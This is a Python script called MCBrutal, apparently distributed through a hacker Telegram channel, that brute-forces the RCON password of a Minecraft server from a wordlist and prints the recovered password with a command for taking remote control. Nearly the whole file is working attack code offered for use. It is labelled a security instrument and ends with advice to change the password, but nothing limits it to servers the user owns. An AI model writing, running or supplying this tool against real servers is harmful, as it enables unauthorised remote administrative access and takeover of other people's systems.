#!/usr/bin/python3

'''
    Специально разработано для канала Meta Hacker.
    Присоиденяйся к нам! -> https://t.me/metah4cker

    Specially developed for the Meta Hacker channel.
    Join us now! -> https://t.me/metah4cker

    ================================================

    MCBrutal
    Copyright (C) 2023  Meta Hacker

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import mcrcon
import time
import sys
import argparse

from colorama import init, just_fix_windows_console, Fore, Style

if sys.platform == 'win32':
    init()
    just_fix_windows_console()

banner = ''' ___ ___    __  ____   ____  __ __  ______   ____  _     
|   |   |  /  ]|    \ |    \|  |  ||      | /    || |    
| _   _ | /  / |  o  )|  D  )  |  ||      ||  o  || |    
|  \_/  |/  /  |     ||    /|  |  ||_|  |_||     || |___ 
|   |   /   \_ |  O  ||    \|  :  |  |  |  |  _  ||     |
|   |   \     ||     ||  .  \     |  |  |  |  |  ||     |
|___|___|\____||_____||__|\_|\__,_|  |__|  |__|__||_____|
  Cybersecurity instrument specially developed for the
         Meta Hacker | https://t.me/metah4cker
'''

printi = lambda *a, **kw: print(f' {Style.BRIGHT}[{Fore.CYAN}i{Fore.RESET}]{Style.RESET_ALL}', *a, **kw)
printe = lambda *a, **kw: print(f' {Style.BRIGHT}[{Fore.LIGHTRED_EX}-{Fore.RESET}]', *a, **kw)
prints = lambda *a, **kw: print(f' {Style.BRIGHT}[{Fore.LIGHTGREEN_EX}+{Fore.RESET}]', *a, **kw)

def brute_rcon(host='localhost', port=25575, wordlist_path='passwords.txt'):

    printi('Host:', host)
    printi('Port:', port)
    printi('Wordlist:', wordlist_path)
    
    try:
        with open(wordlist_path) as f:
            passwords = f.read().splitlines()
    except Exception as e:
        printe(f'Impossible to read wordlist. Error:{Fore.RED}', e, Style.RESET_ALL)
        sys.exit(1)

    plen = len(passwords)
    password = None

    for i, p in enumerate(passwords):
        perc = str(int(i/plen * 100))
        printi(f'Bruteforcing... P: {Fore.GREEN}{perc:<3} {Fore.RESET}% \\ {Fore.GREEN}100 {Fore.RESET}% | Password: {Fore.RED}{p:<60}{Style.RESET_ALL}\r', end='')

        try:
            mr = mcrcon.MCRcon(host, p, port)
            mr.connect()
            password = p
            break
        except:
            pass

    if password is None:
        printe('Password not found. Password of server is strong!'.ljust(70))
        return

    prints(f'Password found: {Fore.GREEN}{password}{Style.RESET_ALL}'.ljust(70))
    printi(f'You can run RCON by the command: {sys.executable} rcon.py {host} -p {password}' + f' -P {port}' if port != 25575 else '')
    printi(f'{Style.BRIGHT}RECOMMENDATION:{Style.RESET_ALL} Your server is in danger zone! You must change the RCON password or disable RCON and use SSH to remotely access the server!')

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('host',
                        help='ip-address of server')
    parser.add_argument('-p', '--port',
                        type=int,
                        default=25575,
                        help='rcon service port (default -> 25575)')
    parser.add_argument('-w', '--wordlist',
                        default='passwords.txt',
                        help='path to the wordlist (file with passwords) (default -> passwords.txt)')

    args = parser.parse_args()

    print(banner)

    brute_rcon(args.host, args.port, args.wordlist)
